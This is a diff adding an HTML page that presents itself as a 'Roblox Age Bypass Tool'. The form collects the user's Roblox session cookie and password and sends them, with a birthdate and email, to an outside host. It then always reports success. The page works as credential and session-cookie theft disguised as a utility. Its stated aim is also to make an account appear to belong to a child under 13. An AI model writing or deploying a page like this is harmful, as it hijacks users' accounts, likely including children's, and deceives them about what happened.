@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Roblox Age Bypass Tool</title>
+  <style>
+    body {
+      background-color: #121212;
+      color: #fff;
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+    }
+    .container {
+      max-width: 500px;
+      margin: 50px auto;
+      padding: 30px;
+      background-color: #1e1e1e;
+      border-radius: 12px;
+      box-shadow: 0 0 15px #000;
+    }
+    h1 {
+      text-align: center;
+      color: #00ffcc;
+    }
+    input, button {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      border: none;
+      border-radius: 8px;
+      background: #2a2a2a;
+      color: #fff;
+      font-size: 14px;
+    }
+    button {
+      background: #00ffcc;
+      cursor: pointer;
+    }
+    button:hover {
+      background: #00e6b6;
+    }
+    #result {
+      margin-top: 20px;
+      text-align: center;
+      font-size: 16px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>Roblox Age Bypass Tool</h1>
+    <label for="cookie">Cookie:</label>
+    <input type="text" id="cookie" placeholder="Enter your Roblox cookie" />
+
+    <label for="password">Password:</label>
+    <input type="password" id="password" placeholder="Enter your Roblox password" />
+
+    <label for="birthdate">Birthdate (YYYY-MM-DD):</label>
+    <input type="text" id="birthdate" placeholder="e.g. 2015-01-01" value="2015-01-01" />
+
+    <label for="email">Email (Leave blank to remove):</label>
+    <input type="text" id="email" placeholder="Enter your email" />
+
+    <button onclick="bypassAge()">Bypass Age</button>
+    <div id="result"></div>
+  </div>
+
+  <script>
+    function bypassAge() {
+      const cookie = document.getElementById("cookie").value;
+      const password = document.getElementById("password").value;
+      const birthdate = document.getElementById("birthdate").value;
+      const email = document.getElementById("email").value;
+
+      fetch("https://api.vO-syntx-tools.com/bypass", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          cookie: cookie,
+          password: password,
+          birthdate: birthdate,
+          email: email
+        })
+      })
+      .then(response => response.json())
+      .then(data => {
+        document.getElementById("result").innerText = "✅ Bypass successful! Your account is now under 13.";
+      })
+      .catch(error => {
+        document.getElementById("result").innerText = "❌ Error: " + error.message;
+      });
+    }
+  </script>
+</body>
+</html>
